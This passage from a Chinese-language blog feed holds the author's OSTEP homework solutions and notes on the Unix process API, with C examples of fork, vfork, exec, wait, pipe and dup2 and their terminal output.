class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 1</span><br><span class="line">gcc -g -Wall 1.c -o 1</span><br><span class="line">1.c: In function ‘main’:</span><br><span class="line">1.c:20:9: warning: implicit declaration of function ‘wait’ [-Wimplicit-function-declaration]</span><br><span class="line">         wait(NULL);</span><br><span class="line">         ^</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./1</span><br><span class="line">1</span><br><span class="line">fork 2</span><br><span class="line">fork 3</span><br><span class="line">2</span><br></pre></td></tr></table></figure><blockquote><p>子进程和父进程变量没有任何关系</p></blockquote><ol start="2"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// #define NDEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./flag&quot;</span>,O_RDWR|O_APPEND);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span>==pid)&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;child&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;child&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// usleep(100);</span></span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;parent&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;parent&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./2</span><br><span class="line">parent:1111111111</span><br><span class="line">child:xxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">parent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxchildxxxxx⏎                  </span><br></pre></td></tr></table></figure><blockquote><p>可以看出父子是共享文件描述符的，父进程读后文件的读写位置往后移到了xxxxx，可以用<code>    lseek(fd, 0, SEEK_SET);</code>把他移到开头</p><p>并发的写入由于操作系统调度顺序问题，写入顺序是随机的，竞争关系的他们并不能同时使用fd，操作系统应该加了一些锁</p></blockquote><ol start="3"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        x = <span class="number">66</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello  &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;world-----&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 3</span><br><span class="line">gcc -g -Wall 3.c -o 3</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./3</span><br><span class="line">hello  world-----66⏎    </span><br></pre></td></tr></table></figure><blockquote><p>可以调用vfork函数，和fork函数的区别就是他会阻塞父进程，直到子进程调用exec或exit才恢复调度可能，在此之前和父进程共享所以内存包括栈！可以看的x已经被修改</p></blockquote><ol start="4"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="type">char</span>* cmd = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* name = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* arg[] = &#123; <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// execl(cmd, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</span></span><br><span class="line">        execlp(name, <span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// execve(cmd, arg, envp);</span></span><br><span class="line">        <span class="comment">// execv(cmd, arg);</span></span><br><span class="line">        <span class="comment">// execvp(name, arg);</span></span><br><span class="line">        <span class="comment">// execle(cmd, &quot;ls&quot;, NULL, envp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以exec为前缀</p><ul><li>l(list)使用参数地址列表,以空指针结束标志<code>execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</code>。第二个参数ls没有太大意义，如果要给ls传参必须写上这个字符串，</li><li>v(vector) 以 NULL结尾字符串数组的指针作参数</li><li>p(path) PATH环境变量指定的目录搜索可执行文件,可以不用写路径</li><li>e(environment) 可以传存有环境变量envp字符串地址的指针数组的地址，无后缀e的话使用当前进程环境变量</li></ul></blockquote><ol start="5"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;gr&quot;</span>);</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rs);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        assert(pid == rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rxer@grxer /m/h/S/O/o/cpu-api&gt; make 5</span><br><span class="line">gcc -g -Wall 5.c -o 5</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./5</span><br><span class="line">gr</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><blockquote><p>父进程wait成功等待了返回子进程id，否则-1，子进程返回-1</p></blockquote><ol start="6"><li></li></ol><blockquote><p>其他更精细的事情，比如非阻塞等待：希望子进程退出能够被我父进程检测到，同时我又不希望我父进程处于阻塞等待<code>waitpid(pid,NULL,WNOHANG)</code></p></blockquote><ol start="7"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child hello&quot;</span>);</span><br><span class="line">        close(STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent : hello&quot;</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; world\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 7</span><br><span class="line">gcc -g -Wall 7.c -o 7</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./7</span><br><span class="line">parent : hello world</span><br></pre></td></tr></table></figure><blockquote><p>没有输出的同时可以看出子进程继承了文件描述符，但是继承过后就是私有的了，不会影响父进程</p></blockquote><ol start="8"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> pidfd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> res = pipe(pidfd);</span><br><span class="line">    assert(<span class="number">0</span> == res);</span><br><span class="line">    pid[<span class="number">0</span>] = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid[<span class="number">0</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork1 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">0</span>]) &#123;</span><br><span class="line">        close(pidfd[<span class="number">0</span>]);<span class="comment">//read</span></span><br><span class="line">        assert(dup2(pidfd[<span class="number">1</span>], STDOUT_FILENO) == STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i am from pid[0]&quot;</span>);</span><br><span class="line">        close(pidfd[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        pid[<span class="number">1</span>] = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid[<span class="number">1</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork2 fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            close(pidfd[<span class="number">1</span>]);<span class="comment">//write</span></span><br><span class="line">            assert(dup2(pidfd[<span class="number">0</span>], STDIN_FILENO) == STDIN_FILENO);</span><br><span class="line">            read(STDIN_FILENO,buf,<span class="number">30</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;pid[1]:where are you from??\n %s&quot;</span>,buf);</span><br><span class="line">            close(pidfd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            waitpid(pid[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">            waitpid(pid[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 8</span><br><span class="line">gcc -g -Wall 8.c -o 8</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./8</span><br><span class="line">pid[1]:where are you from??</span><br><span class="line"> i am from pid[0]⏎      </span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span>;</span><br><span class="line">成功返回<span class="number">0</span> 失败返回<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>管道：半双工通道，只允许数据在一个方向上传输的通道。发送方和接收方不能同时发送数据，只能轮流进行发送和接收。用于进程间通信</p><p>pipe函数创建一个管道，pipefd返回管道两端的文件描述符，pipefd[0]是读端，pipefd[1]是写端</p><p>管道可以理解为进程共用的内核空间里的一块内存来充当虚拟文件</p><p><img src="/2023/04/12/OSTEP-homework-5-Process-API/webp.webp" alt="img"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line">On success, these system calls <span class="keyword">return</span> the new descriptor.  On error, <span class="number">-1</span></span><br><span class="line">is returned, and errno is <span class="built_in">set</span> appropriately.</span><br></pre></td></tr></table></figure><p>dup函数创建一个oldfd文件描述符的副本(而且是动态的副本，本质上是一个，只不过起了不同名字)，不过不共享文件描述符标志，返回新文件描述符是取系统当前可用的最小整数值</p><p>dup2 和dup功能一样，不过它可以用newfd指定返回的新文件描述符号，如果newfd是一个已经打开的描述符，会把他先关闭</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API</title>
      <link href="/2023/04/11/OSTEP-5-Process-API/"/>
      <url>/2023/04/11/OSTEP-5-Process-API/</url>
      
        <content type="html"><![CDATA[<h2 id="A-Little-Bit-Process-API"><a href="#A-Little-Bit-Process-API" class="headerlink" title="A Little Bit Process API"></a>A Little Bit Process API</h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d) by (ppid:%d)---%p\n&quot;</span>, (<span class="type">int</span>) getpid(),(<span class="type">int</span>)getppid(),&amp;x);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (pid:%d)---%p\n&quot;</span>,</span><br><span class="line">           rc, (<span class="type">int</span>) getpid(),&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5116</span>)</span></span><br><span class="line">hello, I am parent of 5117 <span class="params">(pid:<span class="number">5116</span>)</span>---0x7ffd842ab520</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5117</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">1</span>)</span>---0x7ffd842ab520</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5164</span>)</span></span><br><span class="line">hello, I am parent of 5165 <span class="params">(pid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5165</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br></pre></td></tr></table></figure><p>man 2 fork</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>调用fork()的进程被称为父进程，fork()会创建一个子进程，子进程不会从 main()函数开始执行，而是直接从 fork()系统调用返回</p><p>子进程得到与父进程用户级虚拟地址空间相同的（但是独立的）一份副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着当父进程调用fork时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的PID。</p><p>fork的实质就是得到父进程在内核里描述进程信息的数据结构的副本，然后给一个新的pid</p><p>fork的子进程和父进程采用了一种叫做写时复制(copy-on-write )的技术，子进程直接复制了页表，他们刚开始映射到了同一块物理内存，刚开始物理地址和虚拟地址父子都相同，任何一个进程要对共享的页面“写操作”，内核会复制一个物理页面给这个进程使用，同时修改页表映射，copy on write同样存在于进程之间共享内存的场景</p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411222658013.png" alt="image-20230411222658013" style="zoom:67%;"><p>RETURN VALUE<br>    On success, the PID of the child process is returned in the parent, and<br>    0  is returned in the child.  On failure, -1 is returned in the parent,<br>    no child process is created, and errno is set appropriately.</p><p>通过返回值可以进行不同处理</p><p>有趣的时我们上面两次结果的ppid是不同的，这是因为CPU调度程序（scheduler）决定了某个时刻哪个进程被执行，例如上一章的IO</p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411223805891.png" alt="image-20230411223805891"></p><p>进程1（init进程）没有父进程,是所有进程的祖先进程,如果子进程的父进程在子进程结束之前终止了，那么子进程的父进程ID就会变为1，即init进程的PID。</p></blockquote><h3 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h3><p>man 2 wait</p><p>进程结束后,内核并不是立即把它从系统中清除,被保持在一种已终止的状态中，直到被它的父进程回收(reaped)。被叫做僵死进程，如果父进程先结束了，虽然init进程会继承他们并回收，我们最好还是让父进程去做</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid,<span class="type">int</span> *stateusp,<span class="type">int</span> options=<span class="number">0</span>)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果在调用waitpid()函数时，当指定等待的子进程已经停止运行或结束了，则waitpid()会立即返回；但是如果子进程还没有停止运行或结束，则调用waitpid()函数的父进程则会被阻塞，暂停运行。</span></span><br><span class="line"><span class="comment">返回：如果成功，则为子进程的 PID, 如果 option WNOHANG, 则为 0, 如果其他错误，则为— 1,</span></span><br><span class="line"><span class="comment">arg1    pid&gt;0 等待集合是一个单独的子进程 id=pid</span></span><br><span class="line"><span class="comment">        pid =0 等待进程组号与目前进程相同的任何进程</span></span><br><span class="line"><span class="comment">        pid=-1 等待集合就是由父进程所有的子进程组成的</span></span><br><span class="line"><span class="comment">        pid&lt; -1等待进程组号为pid绝对值的任何子进程</span></span><br><span class="line"><span class="comment">arg2    放上关于导致返回的子进程的状态信息，wait.h头文件定义了返回宏</span></span><br><span class="line"><span class="comment">arg3    • WNOHANG: 非阻塞等待进程，如果等待集合中的任何子进程都还没有终止，那么就立即返回（返回值为 0)。如果有子进程退出了，父进程调用waitpid函数返回子进程的PID，在等待子进程终止的同时，如果还想做些有用的丁作，这个选项会有用。</span></span><br><span class="line"><span class="comment">        • WUNTRACED: 挂起调用进程的执行，直到等待集合中的一个进程变成巳终止或者被停止。返回的 PID 为导致返回的巳终止或被停止子进程的 PID 。 默认的行为是只返回己终止的子进程。当你想要检查己终止和被停止的子进程时，这个选项会有用。</span></span><br><span class="line"><span class="comment">        • WCONTINUED: 挂起调用进程的执行，直到等待集合中一个正在运行的进程终止或等待集合中一个被停止的进程收到 SIGCONT 信号重新开始执行。 </span></span><br><span class="line"><span class="comment">*/</span>    </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *statusp)</span>;</span><br><span class="line">waitpid的简单版本 相当于waitpid(- <span class="number">1</span>,*statusp, <span class="number">0</span>)</span><br><span class="line">返回：如果成功，则为子进程的 PID, 如果出错，则为 <span class="number">-1</span> 。</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 